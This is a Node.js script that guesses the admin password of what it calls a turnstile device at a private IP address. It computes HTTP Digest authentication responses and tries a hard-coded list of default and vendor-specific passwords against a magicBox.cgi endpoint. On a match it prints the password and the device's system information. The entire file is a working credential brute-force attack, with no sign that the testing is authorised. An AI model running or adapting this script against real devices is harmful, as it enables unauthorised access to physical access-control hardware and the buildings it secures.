const http = require('http');
const crypto = require('crypto');

const passwords = [
  'admin',
  'admin123',
  'admin@123',
  '123456',
  'admin123456',
  'TimeWatch@123',
  'timewatch123',
  'timewatch',
  'admin888',
  '888888',
  'Hicet@123',
  'hicet@123'
];

function md5(str) {
  return crypto.createHash('md5').update(str).digest('hex');
}

function parseDigestHeader(header) {
  const matches = {};
  header.replace(/(\w+)=["']?([^"',]+)["']?/g, (m, k, v) => {
    matches[k] = v;
  });
  return matches;
}

function tryPassword(user, password) {
  return new Promise((resolve) => {
    // Step 1: 401 challenge
    http.get('http://172.25.26.241/cgi-bin/magicBox.cgi?action=getSystemInfo', (res) => {
      const authHeader = res.headers['www-authenticate'];
      if (!authHeader) return resolve({ password, success: false, reason: 'No auth header' });

      const d = parseDigestHeader(authHeader);
      const realm = d.realm;
      const nonce = d.nonce;
      const qop = d.qop;
      const opaque = d.opaque;
      const uri = '/cgi-bin/magicBox.cgi?action=getSystemInfo';
      const method = 'GET';
      const nc = '00000001';
      const cnonce = crypto.randomBytes(8).toString('hex');

      const ha1 = md5(`${user}:${realm}:${password}`);
      const ha2 = md5(`${method}:${uri}`);
      let response;
      if (qop === 'auth') {
        response = md5(`${ha1}:${nonce}:${nc}:${cnonce}:${qop}:${ha2}`);
      } else {
        response = md5(`${ha1}:${nonce}:${ha2}`);
      }

      let authResponse = `Digest username="${user}", realm="${realm}", nonce="${nonce}", uri="${uri}", response="${response}", algorithm=MD5`;
      if (opaque) authResponse += `, opaque="${opaque}"`;
      if (qop) authResponse += `, qop=${qop}, nc=${nc}, cnonce="${cnonce}"`;

      http.get({
        hostname: '172.25.26.241',
        port: 80,
        path: uri,
        headers: { 'Authorization': authResponse }
      }, (res2) => {
        let body = '';
        res2.on('data', c => body += c);
        res2.on('end', () => {
          if (res2.statusCode === 200) {
            resolve({ password, success: true, body });
          } else {
            resolve({ password, success: false, status: res2.statusCode });
          }
        });
      }).on('error', err => resolve({ password, success: false, err: err.message }));
    }).on('error', err => resolve({ password, success: false, err: err.message }));
  });
}

async function testAll() {
  for (const pw of passwords) {
    const res = await tryPassword('admin', pw);
    if (res.success) {
      console.log(`\n>>> SUCCESS! Turnstile password is: "${pw}" <<<`);
      console.log('Device info:', res.body);
      process.exit(0);
    } else {
      console.log(`Failed "${pw}" (${res.status || res.reason})`);
    }
  }
  console.log('\nNone of the common passwords matched directly.');
}

testAll();
